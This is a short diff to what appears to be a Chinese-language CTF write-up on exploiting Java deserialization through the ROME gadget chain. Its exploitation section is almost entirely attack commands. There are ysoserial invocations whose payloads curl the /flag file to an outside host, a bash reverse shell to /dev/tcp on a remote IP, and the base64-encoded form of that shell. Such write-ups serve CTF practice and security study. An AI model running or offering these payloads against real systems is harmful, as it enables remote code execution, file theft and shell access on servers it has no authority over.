@@ -20,7 +20,7 @@ ROME的应用场景包括新闻聚合应用、博客平台的RSS输出、数据�
 ## **利用**
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://vps:7015 -d @/flag" > a.bin
-
+java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64
 
 bash -i >& /dev/tcp/111.111.111.111/7015 0>&1
 进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx
